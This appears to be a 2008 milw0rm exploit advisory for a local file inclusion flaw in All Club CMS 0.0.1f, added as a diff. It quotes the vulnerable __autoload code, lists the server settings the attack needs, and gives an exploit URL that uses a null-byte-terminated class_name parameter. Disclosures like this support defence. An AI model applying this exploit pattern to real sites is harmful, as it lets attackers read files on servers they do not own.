@@ -1,0 +1,35 @@
+Vulnerability: File Inclusion
+
+Software Vulnerable:
+
+All Club CMS 0.0.1f and maybe prior versions.
+
+Vulnerable Code:
+
+---
+function __autoload($class_name) {
+    require_once 'includes/'.$class_name . '.php';
+}
+---
+
+
+Download:
+http://sourceforge.net/project/showfiles.php?group_id=209058
+
+Server should have:
+    Register Globals: On
+    Magic_quotes_gpc: Off
+
+Exploit :                                                  
+http://www.vulnerable.com/accms_site/index.php?class_name=[LFI]%00
+
+
+Greetz:
+
+P1mp4m.es--> pepepistola, musashi, patoruzu, ElvisPresley and sky
+Yashira.org--> PescaoDeth, Garcez, Crackneo, alexhk_23 and all users of yashira as dapaf, el_manguan, etc.
+
+
+Author: Trancek 
+
+# milw0rm.com [2008-02-04]
